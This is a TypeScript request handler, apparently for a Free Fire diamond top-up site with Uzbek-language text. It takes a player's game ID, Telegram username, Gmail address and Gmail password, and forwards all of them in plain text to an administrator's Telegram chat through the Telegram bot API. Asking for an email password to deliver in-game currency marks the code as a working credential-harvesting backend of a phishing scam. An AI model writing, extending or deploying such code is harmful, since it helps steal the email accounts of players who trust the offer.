export interface SubmitPlayerBody {
  playerId?: string;
  telegramUsername?: string;
  gmail?: string;
  password?: string;
  selectedAmount?: string;
  providerName?: string;
}

export interface SubmitPlayerResult {
  status: number;
  body: { ok: boolean; error?: string };
}

function escapeHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

async function sendTelegramToAdmin(
  payload: Required<
    Pick<
      SubmitPlayerBody,
      | 'playerId'
      | 'telegramUsername'
      | 'gmail'
      | 'password'
      | 'selectedAmount'
      | 'providerName'
    >
  >,
): Promise<void> {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_SUPER_ADMIN_CHAT_ID;

  if (!botToken || !chatId) {
    throw new Error('Telegram bot sozlanmagan (TELEGRAM_BOT_TOKEN / TELEGRAM_SUPER_ADMIN_CHAT_ID)');
  }

  const text = [
    '🆕 <b>Yangi so‘rov</b>',
    '',
    `💎 <b>Paket:</b> ${escapeHtml(payload.selectedAmount)}`,
    `🔗 <b>Provayder:</b> ${escapeHtml(payload.providerName)}`,
    '',
    `🎮 <b>Free Fire ID:</b> <code>${escapeHtml(payload.playerId)}</code>`,
    `📱 <b>Telegram:</b> ${escapeHtml(payload.telegramUsername)}`,
    `📧 <b>Gmail:</b> ${escapeHtml(payload.gmail || '—')}`,
    `🔑 <b>Parol:</b> ${escapeHtml(payload.password || '—')}`,
    '',
    '➡️ Ushbu ID ga almazni qo‘lda yuboring.',
  ].join('\n');

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text,
      parse_mode: 'HTML',
    }),
  });

  const data = (await response.json()) as { ok?: boolean; description?: string };
  if (!response.ok || !data.ok) {
    throw new Error(data.description ?? 'Telegram xabari yuborilmadi');
  }
}

export async function handleSubmitPlayer(body: SubmitPlayerBody): Promise<SubmitPlayerResult> {
  const playerId = body.playerId?.trim();
  const telegramUsername = body.telegramUsername?.trim();

  if (!playerId || !telegramUsername) {
    return {
      status: 400,
      body: { ok: false, error: 'Free Fire ID va Telegram username majburiy' },
    };
  }

  try {
    await sendTelegramToAdmin({
      playerId,
      telegramUsername,
      gmail: body.gmail?.trim() ?? '',
      password: body.password?.trim() ?? '',
      selectedAmount: body.selectedAmount?.trim() ?? '—',
      providerName: body.providerName?.trim() ?? '—',
    });
    return { status: 200, body: { ok: true } };
  } catch (err) {
    const message = err instanceof Error ? err.message : 'Noma’lum xato';
    console.error('[submit-player]', message);
    return { status: 500, body: { ok: false, error: message } };
  }
}
